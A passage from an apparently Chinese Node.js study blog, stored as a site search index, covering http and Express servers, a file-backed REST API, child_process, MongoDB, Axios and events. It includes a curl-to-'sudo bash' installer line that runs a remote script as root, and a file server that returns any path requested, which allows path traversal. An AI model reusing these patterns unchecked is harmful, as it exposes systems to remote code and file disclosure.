输出提交的数据 res.write(\u0026#34;NAME：\u0026#34; + body.name); res.write(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); res.write(\u0026#34;URL：\u0026#34; + body.url); } else { // 输出表单 res.write(postHTML); } res.end(); }); }).listen(3000); 📙Web server\nvar http = require(\u0026#39;http\u0026#39;); var fs = require(\u0026#39;fs\u0026#39;); var url = require(\u0026#39;url\u0026#39;); // 创建服务器 http.createServer( function (request, response) { // 解析请求，包括文件名 var pathname = url.parse(request.url).pathname; // 输出请求的文件名 console.log(\u0026#34;Request for \u0026#34; + pathname + \u0026#34; received.\u0026#34;); // 从文件系统中读取请求的文件内容 fs.readFile(pathname.substr(1), function (err, data) { if (err) { console.log(err); // HTTP 状态码: 404 : NOT FOUND // Content Type: text/html response.writeHead(404, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;}); }else{ // HTTP 状态码: 200 : OK // Content Type: text/html response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;}); // 响应文件内容 response.write(data.toString()); } // 发送响应数据 response.end(); }); }).listen(188); client\nvar http = require(\u0026#39;http\u0026#39;); // 用于请求的选项 var options = { host: \u0026#39;localhost\u0026#39;, port: \u0026#39;3276\u0026#39;, path: \u0026#39;/api/fileApi/GetByfid?fid=1\u0026#39; }; // 处理响应的回调函数 var callback = function(response){ // 不断更新数据 var body = \u0026#39;\u0026#39;; response.on(\u0026#39;data\u0026#39;, function(data) { body += data; }); response.on(\u0026#39;end\u0026#39;, function() { // 数据接收完成 console.log(body); }); } // 向服务端发送请求 var req = http.request(options, callback); req.end(); 📓express router\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); // 主页输出 \u0026#34;Hello World\u0026#34; app.get(\u0026#39;/\u0026#39;, function (req, res) { console.log(\u0026#34;主页 GET 请求\u0026#34;); res.send(\u0026#39;Hello GET\u0026#39;); }) // POST 请求 app.post(\u0026#39;/\u0026#39;, function (req, res) { console.log(\u0026#34;主页 POST 请求\u0026#34;); res.send(\u0026#39;Hello POST\u0026#39;); }) // /del_user 页面响应 app.get(\u0026#39;/del_user\u0026#39;, function (req, res) { console.log(\u0026#34;/del_user 响应 DELETE 请求\u0026#34;); res.send(\u0026#39;删除页面\u0026#39;); }) // /list_user 页面 GET 请求 app.get(\u0026#39;/list_user\u0026#39;, function (req, res) { console.log(\u0026#34;/list_user GET 请求\u0026#34;); res.send(\u0026#39;用户列表页面\u0026#39;); }) // 对页面 abcd, abxcd, ab123cd, 等响应 GET 请求 app.get(\u0026#39;/ab*cd\u0026#39;, function(req, res) { console.log(\u0026#34;/ab*cd GET 请求\u0026#34;); res.send(\u0026#39;正则匹配\u0026#39;); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }) Request 对象 - request 对象表示 HTTP 请求，包含了请求查询字符串，参数，内容，HTTP 头部等属性。常见属性有：\nreq.app：当callback为外部文件时，用req.app访问express的实例 req.baseUrl：获取路由当前安装的URL路径 req.body / req.cookies：获得「请求主体」/ Cookies req.fresh / req.stale：判断请求是否还「新鲜」 req.hostname / req.ip：获取主机名和IP地址 req.originalUrl：获取原始请求URL req.params：获取路由的parameters req.path：获取请求路径 req.protocol：获取协议类型 req.query：获取URL的查询参数串 req.route：获取当前匹配的路由 req.subdomains：获取子域名 req.accepts()：检查可接受的请求的文档类型 req.acceptsCharsets / req.acceptsEncodings / req.acceptsLanguages：返回指定字符集的第一个可接受字符编码 req.get()：获取指定的HTTP请求头 req.is()：判断请求头Content-Type的MIME类型\nResponse 对象 - response 对象表示 HTTP 响应，即在接收到请求时向客户端发送的 HTTP 响应数据。常见属性有：\nres.app：同req.app一样 res.append()：追加指定HTTP头 res.set()在res.append()后将重置之前设置的头 res.cookie(name，value [，option])：设置Cookie opition: domain / expires / httpOnly / maxAge / path / secure / signed res.clearCookie()：清除Cookie res.download()：传送指定路径的文件 res.get()：返回指定的HTTP头 res.json()：传送JSON响应 res.jsonp()：传送JSONP响应 res.location()：只设置响应的Location HTTP头，不设置状态码或者close response res.redirect()：设置响应的Location HTTP头，并且设置状态码302 res.render(view,[locals],callback)：渲染一个view，同时向callback传递渲染后的字符串，如果在渲染过程中有错误发生next(err)将会被自动调用。callback将会被传入一个可能发生的错误以及渲染后的页面，这样就不会自动输出了。 res.send()：传送HTTP响应 res.sendFile(path [，options] [，fn])：传送指定路径的文件 -会自动根据文件extension设定Content-Type res.set()：设置HTTP头，传入object可以一次设置多个头 res.status()：设置HTTP状态码 res.type()：设置Content-Type的MIME类型\nstatic app.use(\u0026rsquo;/public\u0026rsquo;, express.static(\u0026lsquo;public\u0026rsquo;));\nGet\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); app.use(\u0026#39;/public\u0026#39;, express.static(\u0026#39;public\u0026#39;)); app.get(\u0026#39;/index.html\u0026#39;, function (req, res) { res.sendFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;index.html\u0026#34; ); }) app.get(\u0026#39;/process_get\u0026#39;, function (req, res) { // 输出 JSON 格式 var response = { \u0026#34;first_name\u0026#34;:req.query.first_name, \u0026#34;last_name\u0026#34;:req.query.last_name }; console.log(response); res.end(JSON.stringify(response)); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }) Post\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); var bodyParser = require(\u0026#39;body-parser\u0026#39;); // 创建 application/x-www-form-urlencoded 编码解析 var urlencodedParser = bodyParser.urlencoded({ extended: false }) app.use(\u0026#39;/public\u0026#39;, express.static(\u0026#39;public\u0026#39;)); app.get(\u0026#39;/index.html\u0026#39;, function (req, res) { res.sendFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;index.html\u0026#34; ); }) app.post(\u0026#39;/process_post\u0026#39;, urlencodedParser, function (req, res) { // 输出 JSON 格式 var response = { \u0026#34;first_name\u0026#34;:req.body.first_name, \u0026#34;last_name\u0026#34;:req.body.last_name }; console.log(response); res.end(JSON.stringify(response)); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }) 📒RESTful API\ndata\n{ \u0026#34;b1\u0026#34; : { \u0026#34;name\u0026#34; : \u0026#34;h\u0026#34;, \u0026#34;con\u0026#34; : \u0026#34;hihihi\u0026#34;, \u0026#34;id\u0026#34;: 1 }, \u0026#34;b2\u0026#34; : { \u0026#34;name\u0026#34; : \u0026#34;b\u0026#34;, \u0026#34;con\u0026#34; : \u0026#34;bobobo\u0026#34;, \u0026#34;id\u0026#34;: 2 }, \u0026#34;b3\u0026#34; : { \u0026#34;name\u0026#34; : \u0026#34;c\u0026#34;, \u0026#34;con\u0026#34; : \u0026#34;cccccc\u0026#34;, \u0026#34;id\u0026#34;: 3 } } list\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#34;fs\u0026#34;); app.get(\u0026#39;/list\u0026#39;, function (req, res) { fs.readFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;books.json\u0026#34;, \u0026#39;utf8\u0026#39;, function (err, data) { console.log( data ); res.end( data ); }); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;访问地址为 http://%s:%s\u0026#34;, host, port) }) add\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#34;fs\u0026#34;); //添加 var bk= { \u0026#34;b4\u0026#34; : { \u0026#34;name\u0026#34; : \u0026#34;b4\u0026#34;, \u0026#34;com\u0026#34; : \u0026#34;this is b4\u0026#34;, \u0026#34;id\u0026#34;: 4 } } app.get(\u0026#39;/add\u0026#39;, function (req, res) { // 读取已存在的数据 fs.readFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;Books.json\u0026#34;, \u0026#39;utf8\u0026#39;, function (err, data) { data = JSON.parse( data ); data[\u0026#34;b4\u0026#34;] = bk[\u0026#34;b4\u0026#34;]; console.log( data ); res.end( JSON.stringify(data)); }); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }) id\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#34;fs\u0026#34;); app.get(\u0026#39;/:id\u0026#39;, function (req, res) { // 首先我们读取已存在的用户 fs.readFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;Books.json\u0026#34;, \u0026#39;utf8\u0026#39;, function (err, data) { data = JSON.parse( data ); var user = data[\u0026#34;b\u0026#34; + req.params.id] console.log( user ); res.end( JSON.stringify(user)); }); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }) delete\nvar express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#34;fs\u0026#34;); var id = 2; app.get(\u0026#39;/delete\u0026#39;, function (req, res) { // First read existing users. fs.readFile( __dirname + \u0026#34;/\u0026#34; + \u0026#34;Books.json\u0026#34;, \u0026#39;utf8\u0026#39;, function (err, data) { data = JSON.parse( data ); delete data[\u0026#34;b\u0026#34; + id]; console.log( data ); res.end( JSON.stringify(data)); }); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34; http://%s:%s\u0026#34;, host, port) }) 📚️child_process Node 提供了 child_process 模块来创建子进程，方法有：\nexec - child_process.exec 使用子进程执行命令，缓存子进程的输出，并将子进程的输出以回调函数参数的形式返回。\nspawn - child_process.spawn 使用指定的命令行参数创建新进程。\nfork - child_process.fork 是 spawn()的特殊形式，用于在子进程中运行的模块，如 fork(\u0026rsquo;./son.js\u0026rsquo;) 相当于 spawn(\u0026rsquo;node\u0026rsquo;, [\u0026rsquo;./son.js\u0026rsquo;]) 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。\nconst fs = require(\u0026#39;fs\u0026#39;); const child_process = require(\u0026#39;child_process\u0026#39;); for(var i=0; i\u0026lt;10; i++) { var workerProcess = child_process.exec(\u0026#39;node hello.js \u0026#39;+i, function (error, stdout, stderr) { if (error) { console.log(error.stack); console.log(\u0026#39;Error code : \u0026#39;+error.code); console.log(\u0026#39;Signal received: \u0026#39;+error.signal); } console.log(\u0026#39;stdout: \u0026#39; + stdout); console.log(\u0026#39;stderr: \u0026#39; + stderr); }); workerProcess.on(\u0026#39;exit\u0026#39;, function (code) { console.log(\u0026#39;子进程已退出，退出码 \u0026#39;+code); }); } spawn() 方法返回流 (stdout \u0026amp; stderr)，在进程返回大量数据时使用。进程一旦开始执行时 spawn() 就开始接收响应。 child_process.fork 是 spawn() 方法的特殊形式。\n📔mogodb mongodb\ndocker run --name mongodb -v /data/mongodb0:/data/db -p 27017:27017 -d mongo npm\nnpm install mongodb 进入 MongoDB 容器的 bash shell 命令如下：\ndocker exec -it mongodb bash #mongosh --host 127.0.0.1 --port 27017 记得在不再需要时停止和删除容器，可以使用以下命令：\ndocker stop mongodb docker rm mongodb \u0026gt; show dbs \u0026gt; show tables \u0026gt; db.site.find() create\nconst { MongoClient } = require(\u0026#39;mongodb\u0026#39;); // MongoDB连接URI const uri = \u0026#39;mongodb://localhost:27017\u0026#39;; // 创建MongoDB客户端 const client = new MongoClient(uri); async function main() { try { // 连接到MongoDB await client.connect(); console.log(\u0026#39;Connected to MongoDB\u0026#39;); // 创建数据库 const databaseName = \u0026#39;myDatabase\u0026#39;; const db = client.db(databaseName); console.log(`Database \u0026#39;${databaseName}\u0026#39; created`); } catch (error) { console.error(\u0026#39;Error:\u0026#39;, error); } finally { // 关闭MongoDB连接 await client.close(); console.log(\u0026#39;Disconnected from MongoDB\u0026#39;); } } main().catch(console.error); insert\nconst { MongoClient } = require(\u0026#39;mongodb\u0026#39;); const uri = \u0026#39;mongodb://localhost:27017\u0026#39;; const client = new MongoClient(uri); async function main() { try { await client.connect(); console.log(\u0026#39;Connected to MongoDB\u0026#39;); const databaseName = \u0026#39;myDatabase\u0026#39;; const db = client.db(databaseName); console.log(`Database \u0026#39;${databaseName}\u0026#39; created`); // 插入数据 const collectionName = \u0026#39;myCollection\u0026#39;; const collection = db.collection(collectionName); // 插入单个文档 const insertResult = await collection.insertOne({ name: \u0026#39;m2\u0026#39;, age: 18, email: \u0026#39;m@qq.com\u0026#39; }); // console.log(\u0026#39;Inserted document:\u0026#39;, insertResult.ops[0]); // 查询数据 const queryResult = await collection.find({}).toArray(); console.log(\u0026#39;Query result:\u0026#39;, queryResult); } catch (error) { console.error(\u0026#39;Error:\u0026#39;, error); } finally { await client.close(); console.log(\u0026#39;Disconnected from MongoDB\u0026#39;); } } main().catch(console.error); update delete\n// 更新数据 const filter = { name: \u0026#39;m\u0026#39; }; const update = { $set: { age: 15 } }; const updateResult = await collection.updateOne(filter, update); console.log(\u0026#39;Update result:\u0026#39;, updateResult.modifiedCount); // 查询数据并打印更新后的结果 const queryResult = await collection.find({ name: \u0026#39;m\u0026#39; }).toArray(); console.log(\u0026#39;Query result after update:\u0026#39;, queryResult); // 删除数据 const deleteResult = await collection.deleteOne({ name: \u0026#39;m2\u0026#39; }); console.log(\u0026#39;Delete result:\u0026#39;, deleteResult.deletedCount); asiox 请求 ，header添加 Authorization 值为Bearer xx\n使用 Node.js 和 Axios 发送请求并在请求头添加 Authorization 值为 Bearer xx\nconst axios = require(\u0026#39;axios\u0026#39;); // 定义请求的 URL const url = \u0026#39;https://example.com/api\u0026#39;; // 定义请求头，添加 Authorization 字段 const headers = { \u0026#39;Authorization\u0026#39;: \u0026#39;Bearer xx\u0026#39; }; // 发送 GET 请求 axios.get(url, { headers }) .then(response =\u0026gt; { console.log(response.data); }) .catch(error =\u0026gt; { console.error(error); }); 首先，我们通过 require(\u0026lsquo;axios\u0026rsquo;) 引入 Axios 库，这是一个非常流行的用于在 Node.js 中发送 HTTP 请求的库。 然后，我们定义了请求的 url，这里的 https://example.com/api 是一个示例的 API 端点，可以将其替换为实际要请求的地址。 接着，我们创建了一个 headers 对象，其中包含 Authorization 字段，其值为 Bearer xx。Bearer 通常用于传递访问令牌（token），可以将 xx 替换为的实际令牌。 最后，我们使用 axios.get(url, { headers }) 发送一个 GET 请求。第一个参数是请求的 URL，第二个参数是一个配置对象，其中包含我们定义的 headers。 .then() 方法处理请求成功的情况，它接收服务器返回的数据并将其打印到控制台。 .catch() 方法处理请求失败的情况，它接收错误对象并将错误信息打印到控制台。 如果需要发送 POST 请求，可以使用以下代码：\nconst axios = require(\u0026#39;axios\u0026#39;); // 定义请求的 URL const url = \u0026#39;https://example.com/api\u0026#39;; // 定义请求头，添加 Authorization 字段 const headers = { \u0026#39;Authorization\u0026#39;: \u0026#39;Bearer xx\u0026#39; }; // 要发送的数据 const data = { key: \u0026#39;value\u0026#39; }; // 发送 POST 请求 axios.post(url, data, { headers }) .then(response =\u0026gt; { console.log(response.data); }) .catch(error =\u0026gt; { console.error(error); }); 与 GET 请求类似，但我们使用 axios.post(url, data, { headers }) 发送 POST 请求。 这里的 data 是要发送的数据，它可以是一个对象、数组或其他数据类型。 同样，headers 包含 Authorization 信息，url 是请求的地址。\n对于 PUT 请求，使用 axios.put(url, data, { headers })。 对于 DELETE 请求，使用 axios.delete(url, { headers })。\nEnd\n","permalink":"https://qfsyso.github.io/posts/nodejs-study/","summary":"📘 util util const util = require(\u0026#39;util\u0026#39;); util.isArray([]) util.isRegExp(/some regexp/) util.isDate(new Date()) // true util.isDate(Date()) // false (without \u0026#39;new\u0026#39; returns a String) os var os = require(\u0026#34;os\u0026#34;); // CPU 的字节序 console.log(\u0026#39;endianness : \u0026#39; + os.endianness()); // 操作系统名 console.log(\u0026#39;type : \u0026#39; + os.type()); // 操作系统名 console.log(\u0026#39;platform : \u0026#39; + os.platform()); // 系统内存总量 console.log(\u0026#39;total memory : \u0026#39; + os.totalmem() + \u0026#34; bytes.\u0026#34;); // 操作系统空闲内存量 console.log(\u0026#39;free memory : \u0026#39; + os.freemem() + \u0026#34; bytes.","title":"Nodejs Study"},{"content":"简单的说 Node.js 就是运行在服务端的 JavaScript。\nNode.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。\nNode.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。\n🛠Node.js安装 Node.js安装在上一篇文章Debian Node.js HEXO 有讲到\n截至目前最新的版本是20.12.2\n#查看版本 node -v v20.12.2\nwin下可以在官网下载安装 https://nodejs.org/en/download\ndebian nodejs node 14版本\n$ apt-get update $ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash - #如果提示sudo 命令没有找到，一定要下载，执行apt-get install sudo -y 即可，然后再执行上述命令\n$ apt-get install nodejs -y $ node --version //验证 当然如果需要安装node20版本，只需将上述命令替换为：\n$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 💬helloworld hi.js\nconsole.log(\u0026#34;hello world node.js \u0026#34;) // like javascript~ node hi.js [20240504n11]\n👩‍🏫Node.js 创建第一个应用 require 指令 var http = require(\u0026#34;http\u0026#34;); 创建服务器/接收响应请求 var http = require(\u0026#39;http\u0026#39;); http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); // 发送响应数据 \u0026#34;Hello World\u0026#34; response.end(\u0026#39;Hello World\\n\u0026#39;); }).listen(8888); // 终端打印如下信息 console.log(\u0026#39;Server running at http://127.0.0.1:1200/\u0026#39;); 🚀npm使用 npm 是包管理工具 允许用户从NPM服务器下载别人编写的第三方包到本地使用。 允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。 允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。\nnpm -v\n如果你安装的是旧版本的 npm，可以很容易得通过 npm 命令来升级，命令如下：\n$ sudo npm install npm -g /usr/local/bin/npm -\u0026gt; /usr/local/lib/node_modules/npm/bin/npm-cli.js npm@2.14.2 /usr/local/lib/node_modules/npm 如果是 Window 系统使用以下命令即可：\nnpm install npm -g 使用淘宝镜像的命令：\nnpm install -g cnpm \u0026ndash;registry=https://registry.npmmirror.com\n全局安装与本地安装 npm 的包安装分为本地安装（local）、全局安装（global）两种，从敲的命令行来看，差别只是有没有-g而已，比如\nnpm install express # 本地安装 npm install express -g # 全局安装 如果出现以下错误：\nnpm err! Error: connect ECONNREFUSED 127.0.0.1:8087 解决办法为：\n$ npm config set proxy null\n查看安装信息 npm list\n── express@4.19.2\nnpm list -g\n使用package.json -node_modules/express/package.json 内容：\nPackage.json 属性说明\nname - 包名。\nversion - 包的版本号。\ndescription - 包的描述。\nhomepage - 包的官网 url 。\nauthor - 包的作者姓名。\ncontributors - 包的其他贡献者姓名。\ndependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。\nrepository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。\nmain - main 字段指定了程序的主入口文件，require(\u0026lsquo;moduleName\u0026rsquo;) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。\nkeywords - 关键字\n卸载\nnpm uninstall express npm ls 更新\nnpm update express 创建\nnpm init This utility will walk you through creating a package.json file. It only covers the most common items, and tries to guess sensible defaults.\nSee npm help json for definitive documentation on these fields and exactly what they do.\nUse npm install \u0026lt;pkg\u0026gt; --save afterwards to install a package and save it as a dependency in the package.json file.\nPress ^C at any time to quit. name: (node_modules) runoob # 模块名 version: (1.0.0) description: Node.js 测试模块(www.runoob.com) # 描述 entry point: (index.js) test command: make test git repository: https://github.com/runoob/runoob.git # Github 地址\nauthor: license: (ISC) About to write to ……/node_modules/package.json: # 生成地址\n{ \u0026ldquo;name\u0026rdquo;: \u0026ldquo;runoob\u0026rdquo;, \u0026ldquo;version\u0026rdquo;: \u0026ldquo;1.0.0\u0026rdquo;, \u0026ldquo;description\u0026rdquo;: \u0026ldquo;Node.js 测试模块(www.runoob.com)\u0026rdquo;, …… }\nIs this ok? (yes) yes\nyes后会生成 package.json npm adduser Username: mcmohd Password: Email: (this IS public) mcmohd@gmail.com\n发布 npm publish\n就可以跟其他模块一样使用 npm 来安装\n🔭Node.js 回调函数 Node.js 异步编程的直接体现就是回调。\n异步编程依托于回调来实现，但不能说使用了回调后程序就异步化了。\n回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。\n例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。\n回调函数一般作为函数的最后一个参数出现：\nfunction foo1(name, age, callback) { } function foo2(value, callback1, callback2) { } 阻塞代码实例 创建一个文件 x.txt ，内容如下：\nhi hi hi\n创建 main.js 文件, 代码如下：\nvar fs = require(\u0026#34;fs\u0026#34;); var data = fs.readFileSync(\u0026#39;x.txt\u0026#39;); console.log(data.toString()); console.log(\u0026#34;程序执行结束!\u0026#34;); 以上代码执行结果如下：\nnode main.js\nhi hi hi\n程序执行结束!\n非阻塞代码实例 创建一个文件 input.txt ，内容如下：\n菜鸟教程官网地址：www.runoob.com 创建 main.js 文件, 代码如下：\nvar fs = require(\u0026#34;fs\u0026#34;); fs.readFile(\u0026#39;input.txt\u0026#39;, function (err, data) { if (err) return console.error(err); console.log(data.toString()); }); console.log(\u0026#34;程序执行结束!\u0026#34;); 以上代码执行结果如下：\nnode main.js\n程序执行结束! hi hi hi 以上两个实例我们了解了阻塞与非阻塞调用的不同。第一个实例在文件读取完后才执行程序。 第二个实例我们不需要等待文件读取完，这样就可以在读取文件时同时执行接下来的代码，大大提高了程序的性能。\n因此，阻塞是按顺序执行的，而非阻塞是不需要按顺序的，所以如果需要处理回调函数的参数，我们就需要写在回调函数内。\n🐞Node.js 事件循环 Node.js 是单进程单线程应用程序，但是因为 V8 引擎提供的异步执行回调接口，通过这些接口可以处理大量的并发，所以性能非常高。\nNode.js 几乎每一个 API 都是支持回调函数的。\nNode.js 基本上所有的事件机制都是用设计模式中观察者模式实现。\nNode.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.\n事件驱动程序 Node.js 使用事件驱动模型，当web server接收到请求，就把它关闭然后进行处理，然后去服务下一个web请求。\n当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。\n这个模型非常高效可扩展性非常强，因为 webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）\n在事件驱动模型中，会生成一个主循环来监听事件，当检测到事件时触发回调函数。\nEventEmitters -\u0026gt; Events =\u0026gt;\u0026lt;= EventLoop -\u0026gt; Event Handlers\n整个事件驱动的流程就是这么实现的，非常简洁。有点类似于观察者模式，事件相当于一个主题(Subject)，而所有注册到这个事件上的处理函数相当于观察者(Observer)。\nNode.js 有多个内置的事件，我们可以通过引入 events 模块，并通过实例化 EventEmitter 类来绑定和监听事件，如下实例：\n// 引入 events 模块 var events = require(\u0026#39;events\u0026#39;); // 创建 eventEmitter 对象 var eventEmitter = new events.EventEmitter(); 以下程序绑定事件处理程序：\n// 绑定事件及事件的处理程序 eventEmitter.on(\u0026#39;eventName\u0026#39;, eventHandler); 我们可以通过程序触发事件：\n// 触发事件 eventEmitter.emit(\u0026#39;eventName\u0026#39;); main.js\n// 引入 events 模块 var events = require(\u0026#39;events\u0026#39;); // 创建 eventEmitter 对象 var eventEmitter = new events.EventEmitter(); // 创建事件处理程序 var connectHandler = function connected() { console.log(\u0026#39;连接成功。\u0026#39;); // 触发 data_received 事件 eventEmitter.emit(\u0026#39;data_received\u0026#39;); } // 绑定 connection 事件处理程序 eventEmitter.on(\u0026#39;connection\u0026#39;, connectHandler); // 使用匿名函数绑定 data_received 事件 eventEmitter.on(\u0026#39;data_received\u0026#39;, function(){ console.log(\u0026#39;数据接收成功。\u0026#39;); }); // 触发 connection 事件 eventEmitter.emit(\u0026#39;connection\u0026#39;); console.log(\u0026#34;程序执行完毕。\u0026#34;); connection -\u0026gt; connectHandler -\u0026gt; data_received\nnode main.js 连接成功。 数据接收成功。 程序执行完毕。 Node 应用程序是如何工作的？ 在 Node 应用程序中，执行异步操作的函数将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。\n接下来让我们来重新看下前面的实例，创建一个 x.txt ,文件内容如下：\n//main.js var fs = require(\u0026#34;fs\u0026#34;); fs.readFile(\u0026#39;x.txt\u0026#39;, function (err, data) { if (err){ console.log(err.stack); return; } console.log(data.toString()); }); console.log(\u0026#34;程序执行完毕\u0026#34;); 执行 则异步读取x.txt内容 把路劲改成 x1.txt读取错误则log 错误内容\n📔Node.js EventEmitter Node.js 所有的异步 I/O 操作在完成时都会发送一个事件到事件队列。\nNode.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。 所有这些产生事件的对象都是 events.EventEmitter 的实例。\n//main.js 文件 var EventEmitter = require(\u0026#39;events\u0026#39;).EventEmitter; var event = new EventEmitter(); event.on(\u0026#39;some_event\u0026#39;, function() { console.log(\u0026#39;some_event 事件触发\u0026#39;); }); setTimeout(function() { event.emit(\u0026#39;some_event\u0026#39;); }, 10000); 10s后执行 some_event 输出 事件触发\nEventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。\n当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。\n//main.js 文件 var events = require(\u0026#39;events\u0026#39;); var emitter = new events.EventEmitter(); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) { console.log(\u0026#39;listener1\u0026#39;, arg1, arg2); }); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) { console.log(\u0026#39;listener2\u0026#39;, arg1, arg2); }); emitter.emit(\u0026#39;someEvent\u0026#39;, \u0026#39;arg1 参数\u0026#39;, \u0026#39;arg2 参数\u0026#39;); emitter 为事件 someEvent 注册了两个事件监听器，然后触发了 someEvent 事件。\n运行结果中可以看到两个事件监听器回调函数被先后调用。 这就是EventEmitter最简单的用法。\nEventEmitter 提供了多个属性，如 on 和 emit。on 函数用于绑定事件函数，emit 属性用于触发一个事件。接下来我们来具体看下 EventEmitter 的属性介绍。\n.once 监听器最多只会触发一次，触发后立刻解除该监听器\nvar events = require(\u0026#39;events\u0026#39;); var eventEmitter = new events.EventEmitter(); // 监听器 #1 var listener1 = function listener1() { console.log(\u0026#39;监听器 listener1 执行。\u0026#39;); } // 监听器 #2 var listener2 = function listener2() { console.log(\u0026#39;监听器 listener2 执行。\u0026#39;); } // 绑定 connection 事件，处理函数为 listener1 eventEmitter.addListener(\u0026#39;connection\u0026#39;, listener1); // 绑定 connection 事件，处理函数为 listener2 eventEmitter.on(\u0026#39;connection\u0026#39;, listener2); var eventListeners = eventEmitter.listenerCount(\u0026#39;connection\u0026#39;); console.log(eventListeners + \u0026#34; 个监听器监听连接事件。\u0026#34;); // 处理 connection 事件 eventEmitter.emit(\u0026#39;connection\u0026#39;); // 移除监绑定的 listener1 函数 eventEmitter.removeListener(\u0026#39;connection\u0026#39;, listener1); console.log(\u0026#34;listener1 不再受监听。\u0026#34;); // 触发连接事件 eventEmitter.emit(\u0026#39;connection\u0026#39;); eventListeners = eventEmitter.listenerCount(\u0026#39;connection\u0026#39;); console.log(eventListeners + \u0026#34; 个监听器监听连接事件。\u0026#34;); // 绑定 connection 事件，处理函数为 listener2 eventEmitter.on(\u0026#39;connection\u0026#39;, listener2); eventEmitter.emit(\u0026#39;connection\u0026#39;); eventListeners = eventEmitter.listenerCount(\u0026#39;connection\u0026#39;); console.log(eventListeners + \u0026#34; 个监听器监听连接事件。\u0026#34;); console.log(\u0026#34;程序执行完毕。\u0026#34;); error 事件 EventEmitter 定义了一个特殊的事件 error，它包含了错误的语义，我们在遇到 异常的时候通常会触发 error 事件。\n当 error 被触发时，EventEmitter 规定如果没有响 应的监听器，Node.js 会把它当作异常，退出程序并输出错误信息。\n我们一般要为会触发 error 事件的对象设置监听器，避免遇到错误后整个程序崩溃。例如：\n继承 EventEmitter 大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。\n为什么要这样做呢？原因有两点：\n首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。\n其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。\n⛏ Node.js Buffer JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。\n但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。\n在 Node.js 中，Buffer 类是随 Node 内核一起发布的核心库。Buffer 库为 Node.js 带来了一种存储原始数据的方法，可以让 Node.js 处理二进制数据，每当需要在 Node.js 中处理I/O操作中移动的数据时，就有可能使用 Buffer 库。原始数据存储在 Buffer 类的实例中。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。\nBuffer 与字符编码\nBuffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。\nBuffer.from() 创建对象\nconst buf = 